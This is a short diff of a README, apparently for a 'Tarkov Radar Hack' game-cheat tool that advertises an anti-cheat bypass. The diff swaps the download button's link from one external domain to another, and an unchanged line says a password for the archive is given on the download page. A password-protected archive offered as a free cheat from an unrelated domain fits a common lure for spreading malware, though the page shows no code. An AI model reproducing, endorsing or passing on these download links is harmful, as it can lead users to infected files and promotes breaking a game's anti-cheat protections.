@@ -18,7 +18,7 @@ Tarkov Radar Hack - undetected cheat tool. Anti-cheat bypass included. Works wit
 
 ## Download
 
-[![Download v5.4.0](https://img.shields.io/badge/Download_v5.4.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/tarkovradar)
+[![Download v5.4.0](https://img.shields.io/badge/Download_v5.4.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/tarkovradar)
 
 > The archive password is shown on the download page.
 
